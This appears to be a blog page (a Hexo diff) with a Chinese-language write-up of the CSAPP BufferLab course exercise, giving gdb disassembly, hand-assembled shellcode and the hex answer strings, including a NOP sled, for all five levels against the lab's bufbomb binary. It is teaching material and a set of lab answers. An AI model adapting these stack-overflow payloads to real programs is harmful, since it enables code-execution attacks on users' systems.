@@ -1,0 +1,808 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/learner-lu/picbed/master/logo.png">
+  <link rel="icon" href="https://raw.githubusercontent.com/learner-lu/picbed/master/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4a00e0">
+  <meta name="author" content="luzhixing12345">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言 本次实验和上次03-AttackLab很相似,同样考察的是缓冲区溢出,只不过实验的环境换成了32位(IA32) 本文默认读者已有03-AttackLab的实验经历,背景知识不再赘述,相关过程简略 本次实验采用 bovik 用户,cookie值为 0x1005b2b7  实验报告 本次实验五关是需要根据实验的文档来依次解决的,开始之前请仔细阅读文档  Level0 第一关的要求是返回到smo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="04-BufferLab">
+<meta property="og:url" content="https://luzhixing12345.github.io/2022/11/11/CSAPP/04-BufferLab/index.html">
+<meta property="og:site_name" content="kamilu的博客">
+<meta property="og:description" content="前言 本次实验和上次03-AttackLab很相似,同样考察的是缓冲区溢出,只不过实验的环境换成了32位(IA32) 本文默认读者已有03-AttackLab的实验经历,背景知识不再赘述,相关过程简略 本次实验采用 bovik 用户,cookie值为 0x1005b2b7  实验报告 本次实验五关是需要根据实验的文档来依次解决的,开始之前请仔细阅读文档  Level0 第一关的要求是返回到smo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/learner-lu/picbed/master/20221111014944.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/learner-lu/picbed/master/20221111023303.png">
+<meta property="article:published_time" content="2022-11-10T17:23:22.000Z">
+<meta property="article:modified_time" content="2022-11-11T15:29:15.244Z">
+<meta property="article:author" content="luzhixing12345">
+<meta property="article:tag" content="CSAPP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/learner-lu/picbed/master/20221111014944.png">
+  
+  
+  <title>04-BufferLab - kamilu的博客</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"luzhixing12345.github.io","root":"/","version":"1.8.14","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"fEy8W8VvIoc26nT53dV2157j-gzGzoHsz","app_key":"s9HXuqmvBWrOaAiLA07Jg59A","server_url":"https://fey8w8vv.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Kamilu-blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://raw.githubusercontent.com/learner-lu/picbed/master/background.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="04-BufferLab">
+              
+                04-BufferLab
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-11-11 01:23" pubdate>
+        2022年11月11日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      7k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      59 分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">04-BufferLab</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：4 天前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
+<p>本次实验和上次03-AttackLab很相似,同样考察的是缓冲区溢出,只不过实验的环境换成了32位(IA32)</p>
+<p>本文默认读者已有03-AttackLab的实验经历,背景知识不再赘述,相关过程简略</p>
+<p>本次实验采用 <code>bovik</code> 用户,cookie值为 <code>0x1005b2b7</code></p>
+<h2 id="实验报告"><a class="markdownIt-Anchor" href="#实验报告"></a> 实验报告</h2>
+<p>本次实验五关是需要根据实验的文档来依次解决的,开始之前请仔细阅读文档</p>
+<h3 id="level0"><a class="markdownIt-Anchor" href="#level0"></a> Level0</h3>
+<p>第一关的要求是返回到smoke,test调用了getbuf,getbuf的汇编如下</p>
+<div class="code-wrapper"><pre><code class="hljs txt">0x080491f4 &lt;+0&gt;:     push   %ebp
+0x080491f5 &lt;+1&gt;:     mov    %esp,%ebp
+0x080491f7 &lt;+3&gt;:     sub    $0x38,%esp
+0x080491fa &lt;+6&gt;:     lea    -0x28(%ebp),%eax
+0x080491fd &lt;+9&gt;:     mov    %eax,(%esp)
+0x08049200 &lt;+12&gt;:    call   0x8048cfa &lt;Gets&gt;
+0x08049205 &lt;+17&gt;:    mov    $0x1,%eax
+0x0804920a &lt;+22&gt;:    leave
+0x0804920b &lt;+23&gt;:    ret</code></pre></div>
+<p>这里的leave是x86汇编的指令,相当于</p>
+<div class="code-wrapper"><pre><code class="hljs txt">mov   %ebp, %esp
+pop   %ebp</code></pre></div>
+<p>这里可以看出开辟的栈帧大小是0x38,实际用于输入的空间大小是0x28(40字节),但值得注意的是前面还 <code>push %ebp</code>,所以还有4字节</p>
+<blockquote>
+<p>注意是32位机</p>
+</blockquote>
+<p>可以查看到smoke的地址是 <code>0x08048c18</code></p>
+<p>所以第一关的答案是</p>
+<div class="code-wrapper"><pre><code class="hljs txt">00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00
+18 8c 04 08</code></pre></div>
+<div class="code-wrapper"><pre><code class="hljs bash">root@da1811a84ddc:~/csapp/04Buffer Lab (IA32)/buflab-handout<span class="hljs-comment"># ./hex2raw &lt; 0.txt | ./bufbomb -u bovik</span>
+Userid: bovik
+Cookie: 0x1005b2b7
+Type string:Smoke!: You called smoke()
+VALID
+NICE JOB!</code></pre></div>
+<h3 id="level1"><a class="markdownIt-Anchor" href="#level1"></a> Level1</h3>
+<p>第二关是跳转到fizz函数并且使得参数 rdi的值是cookie的值</p>
+<p>反汇编fizz得到</p>
+<div class="code-wrapper"><pre><code class="hljs txt">0x08048c42 &lt;+0&gt;:     push   %ebp
+0x08048c43 &lt;+1&gt;:     mov    %esp,%ebp              # ebp = esp
+0x08048c45 &lt;+3&gt;:     sub    $0x18,%esp
+0x08048c48 &lt;+6&gt;:     mov    0x8(%ebp),%eax         # eax = (rsp+8)
+0x08048c4b &lt;+9&gt;:     cmp    0x804d108,%eax
+0x08048c51 &lt;+15&gt;:    jne    0x8048c79 &lt;fizz+55&gt;</code></pre></div>
+<p>所以整个栈空间调用过程如图所示</p>
+<p><img src="https://raw.githubusercontent.com/learner-lu/picbed/master/20221111014944.png" srcset="/img/loading.gif" lazyload alt="20221111014944" /></p>
+<p>所以答案如下</p>
+<div class="code-wrapper"><pre><code class="hljs txt">00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00
+42 8c 04 08
+00 00 00 00
+b7 b2 05 10</code></pre></div>
+<div class="code-wrapper"><pre><code class="hljs bash">root@da1811a84ddc:~/csapp/04Buffer Lab (IA32)/buflab-handout<span class="hljs-comment"># ./hex2raw &lt; 1.txt | ./bufbomb -u bovik</span>
+Userid: bovik
+Cookie: 0x1005b2b7
+Type string:Fizz!: You called fizz(0x1005b2b7)
+VALID
+NICE JOB!</code></pre></div>
+<h3 id="level2"><a class="markdownIt-Anchor" href="#level2"></a> Level2</h3>
+<p>调用函数 bang, 同时需要修改全局变量 global_value 的值</p>
+<p>思路类似,返回地址设为栈指针地址,直接修改全局变量的值</p>
+<p>反汇编bang找到global_value的地址为 <code>0x804d100</code></p>
+<div class="code-wrapper"><pre><code class="hljs bash">(gdb) disas bang
+Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> bang:
+   0x08048c9d &lt;+0&gt;:     push   %ebp
+   0x08048c9e &lt;+1&gt;:     mov    %esp,%ebp
+   0x08048ca0 &lt;+3&gt;:     sub    <span class="hljs-variable">$0x18</span>,%esp
+   0x08048ca3 &lt;+6&gt;:     mov    0x804d100,%eax</code></pre></div>
+<p>构造的汇编如下</p>
+<div class="code-wrapper"><pre><code class="hljs x86asm">movl <span class="hljs-number">$0</span>x1005b2b7,<span class="hljs-number">0x804d100</span>
+<span class="hljs-keyword">ret</span></code></pre></div>
+<p><code>gcc -c -m32</code> <code>objdump</code>得到的字节码如下</p>
+<div class="code-wrapper"><pre><code class="hljs txt">level2.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 &lt;.text&gt;:
+   0:   c7 05 00 d1 04 08 b7    movl   $0x1005b2b7,0x804d100
+   7:   b2 05 10
+   a:   c3                      ret</code></pre></div>
+<p>通过打断点的方式得到下方的栈指针的值为 <code>0x55683588</code></p>
+<div class="code-wrapper"><pre><code class="hljs bash">(gdb) disas getbuf
+Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> getbuf:
+   0x080491f4 &lt;+0&gt;:     push   %ebp
+   0x080491f5 &lt;+1&gt;:     mov    %esp,%ebp
+   0x080491f7 &lt;+3&gt;:     sub    <span class="hljs-variable">$0x38</span>,%esp
+   0x080491fa &lt;+6&gt;:     lea    -0x28(%ebp),%eax
+   0x080491fd &lt;+9&gt;:     mov    %eax,(%esp)
+   0x08049200 &lt;+12&gt;:    call   0x8048cfa &lt;Gets&gt;
+   0x08049205 &lt;+17&gt;:    mov    <span class="hljs-variable">$0x1</span>,%eax
+   0x0804920a &lt;+22&gt;:    leave
+   0x0804920b &lt;+23&gt;:    ret
+End of assembler dump.
+(gdb) b *0x080491fd
+Breakpoint 1 at 0x80491fd
+(gdb) r -u bovik
+Starting program: /root/csapp/04Buffer Lab (IA32)/buflab-handout/bufbomb -u bovik
+Userid: bovik
+Cookie: 0x1005b2b7
+
+Breakpoint 1, 0x080491fd <span class="hljs-keyword">in</span> getbuf ()
+(gdb) info r eax
+eax            0x55683588       1432892808</code></pre></div>
+<p>然后得到bang的地址为 <code>0x08048c9d</code>,所以本题答案如下</p>
+<div class="code-wrapper"><pre><code class="hljs txt">c7 05 00 d1 04 08 b7 b2 05 10
+c3 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00
+88 35 68 55
+9d 8c 04 08</code></pre></div>
+<div class="code-wrapper"><pre><code class="hljs bash">root@da1811a84ddc:~/csapp/04Buffer Lab (IA32)/buflab-handout<span class="hljs-comment"># ./hex2raw &lt; 2.txt | ./bufbomb -u bovik</span>
+Userid: bovik
+Cookie: 0x1005b2b7
+Type string:Bang!: You <span class="hljs-built_in">set</span> global_value to 0x1005b2b7
+VALID
+NICE JOB!</code></pre></div>
+<h3 id="level3"><a class="markdownIt-Anchor" href="#level3"></a> Level3</h3>
+<p>本关要求仍返回到 test, 不过返回值要修改为 cookie</p>
+<p>首先拿到test调用getbuf后原本的返回地址 <code>0x08048dbe</code>,接着注意到getbuf还push了ebp,所以我们还需要打断点得到ebp的值 <code>0x556835e0</code></p>
+<div class="code-wrapper"><pre><code class="hljs bash">(gdb) info r ebp
+ebp            0x556835e0       0x556835e0 &lt;_reserved+1037792&gt;</code></pre></div>
+<p>所以对应的汇编如下</p>
+<div class="code-wrapper"><pre><code class="hljs x86asm">movl <span class="hljs-number">$0</span>x1005b2b7,%eax
+movl <span class="hljs-number">$0</span>x556835e0,%ebp
+<span class="hljs-keyword">push</span> <span class="hljs-number">$0</span>x8048dbe
+<span class="hljs-keyword">ret</span></code></pre></div>
+<p>字节码得到</p>
+<div class="code-wrapper"><pre><code class="hljs txt">level3.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 &lt;.text&gt;:
+   0:   b8 b7 b2 05 10          mov    $0x1005b2b7,%eax
+   5:   bd e0 35 68 55          mov    $0x556835e0,%ebp
+   a:   68 be 8d 04 08          push   $0x8048dbe
+   f:   c3                      ret</code></pre></div>
+<p>所以本关答案为</p>
+<div class="code-wrapper"><pre><code class="hljs txt">b8 b7 b2 05 10 bd e0 35 68 55
+68 be 8d 04 08 c3 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00
+88 35 68 55</code></pre></div>
+<div class="code-wrapper"><pre><code class="hljs bash">root@da1811a84ddc:~/csapp/04Buffer Lab (IA32)/buflab-handout<span class="hljs-comment"># ./hex2raw &lt; 3.txt | ./bufbomb -u bovik</span>
+Userid: bovik
+Cookie: 0x1005b2b7
+Type string:Boom!: getbuf returned 0x1005b2b7
+VALID
+NICE JOB!</code></pre></div>
+<h3 id="level4"><a class="markdownIt-Anchor" href="#level4"></a> Level4</h3>
+<p>本关就是栈地址的随机化,有一个±240的偏差,所以不能准确的指定到某一个地址. 我们可以打一个断点来查看五次调用的时候的栈起始地址</p>
+<div class="code-wrapper"><pre><code class="hljs bash">(gdb) disas getbufn
+Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> getbufn:
+   0x0804920c &lt;+0&gt;:     push   %ebp
+   0x0804920d &lt;+1&gt;:     mov    %esp,%ebp
+   0x0804920f &lt;+3&gt;:     sub    <span class="hljs-variable">$0x218</span>,%esp
+   0x08049215 &lt;+9&gt;:     lea    -0x208(%ebp),%eax
+   0x0804921b &lt;+15&gt;:    mov    %eax,(%esp)
+   0x0804921e &lt;+18&gt;:    call   0x8048cfa &lt;Gets&gt;
+   0x08049223 &lt;+23&gt;:    mov    <span class="hljs-variable">$0x1</span>,%eax
+   0x08049228 &lt;+28&gt;:    leave
+   0x08049229 &lt;+29&gt;:    ret
+End of assembler dump.
+(gdb) b *0x0804921b
+Breakpoint 1 at 0x804921b
+(gdb) r -u bovik -n
+Starting program: /root/csapp/04Buffer Lab (IA32)/buflab-handout/bufbomb -u bovik -n
+Userid: bovik
+Cookie: 0x1005b2b7
+
+Breakpoint 1, 0x0804921b <span class="hljs-keyword">in</span> getbufn ()
+(gdb) info r eax
+eax            0x556833a8       1432892328
+(gdb) c
+Continuing.
+Type string:a
+Dud: getbufn returned 0x1
+Better luck next time
+
+Breakpoint 1, 0x0804921b <span class="hljs-keyword">in</span> getbufn ()
+(gdb) info r eax
+eax            0x55683378       1432892280
+(gdb) c
+Continuing.
+Type string:a
+Dud: getbufn returned 0x1
+Better luck next time
+
+Breakpoint 1, 0x0804921b <span class="hljs-keyword">in</span> getbufn ()
+(gdb) info r eax
+eax            0x556833d8       1432892376
+(gdb) c
+Continuing.
+Type string:a
+Dud: getbufn returned 0x1
+Better luck next time
+
+Breakpoint 1, 0x0804921b <span class="hljs-keyword">in</span> getbufn ()
+(gdb) info r eax
+eax            0x55683368       1432892264
+(gdb) c
+Continuing.
+Type string:a
+Dud: getbufn returned 0x1
+Better luck next time
+
+Breakpoint 1, 0x0804921b <span class="hljs-keyword">in</span> getbufn ()
+(gdb) info r eax
+eax            0x55683358       1432892248
+(gdb) c
+Continuing.
+Type string:a
+Dud: getbufn returned 0x1
+Better luck next time
+[Inferior 1 (process 11263) exited normally]</code></pre></div>
+<p>可以得到五次地址分别是 <code>0x556833a8</code> <code>0x55683378</code> <code>0x556833d8</code> <code>0x55683368</code> <code>0x55683358</code>,偏移范围是0x80</p>
+<p>注意到本次缓冲区的长度是0x208(520字节),所以缓冲区的长度大于栈地址的偏移范围,所以我们可以将将返回地址设定为一个最大的栈起始地址,缓冲区全部使用nop指令,滑落到栈底(栈空间中的高位地址),然后执行我们的攻击代码</p>
+<p>同时ebp的值虽然不确定,但是可以通过前后汇编得到ebp和esp的关系是ebp = esp+0x28</p>
+<p>修改返回值eax为cookie,记录testn调用getbufn的返回地址<code>0x08048e3a</code>,所以可以构造攻击汇编代码</p>
+<div class="code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-keyword">lea</span> <span class="hljs-number">0x28</span>(%esp),%ebp
+movl <span class="hljs-number">$0</span>x1005b2b7,%eax
+<span class="hljs-keyword">push</span> <span class="hljs-number">$0</span>x08048e3a
+<span class="hljs-keyword">ret</span></code></pre></div>
+<p>字节码如下</p>
+<div class="code-wrapper"><pre><code class="hljs txt">level4.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 &lt;.text&gt;:
+   0:   8d 6c 24 28             lea    0x28(%esp),%ebp
+   4:   b8 b7 b2 05 10          mov    $0x1005b2b7,%eax
+   9:   68 3a 8e 04 08          push   $0x8048e3a
+   e:   c3                      ret</code></pre></div>
+<p>栈空间情况如下图所示</p>
+<p><img src="https://raw.githubusercontent.com/learner-lu/picbed/master/20221111023303.png" srcset="/img/loading.gif" lazyload alt="20221111023303" /></p>
+<div class="code-wrapper"><pre><code class="hljs txt">90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 90 90
+
+90 90 90 90 90 8d 6c 24 28 b8
+90 90 90 90 90 8d 6c 24 28 b8
+b7 b2 05 10 68 3a 8e 04 08 c3
+90 90 90 90
+d8 33 68 55</code></pre></div>
+<div class="code-wrapper"><pre><code class="hljs bash">root@da1811a84ddc:~/csapp/04Buffer Lab (IA32)/buflab-handout<span class="hljs-comment"># ./hex2raw &lt; 4.txt -n | ./bufbomb -u bovik -n</span>
+Userid: bovik
+Cookie: 0x1005b2b7
+Type string:KABOOM!: getbufn returned 0x1005b2b7
+Keep going
+Type string:KABOOM!: getbufn returned 0x1005b2b7
+Keep going
+Type string:KABOOM!: getbufn returned 0x1005b2b7
+Keep going
+Type string:KABOOM!: getbufn returned 0x1005b2b7
+Keep going
+Type string:KABOOM!: getbufn returned 0x1005b2b7
+VALID
+NICE JOB!</code></pre></div>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CSAPP/">CSAPP</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/11/11/CSAPP/05-ArchitectureLab/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">05-ArchitectureLab</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/11/10/CSAPP/03-AttackLab/">
+                        <span class="hidden-mobile">03-AttackLab</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"fEy8W8VvIoc26nT53dV2157j-gzGzoHsz","appKey":"s9HXuqmvBWrOaAiLA07Jg59A","path":"window.location.pathname","placeholder":"欢迎讨论,留下163邮箱我才能看到回复哦~","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
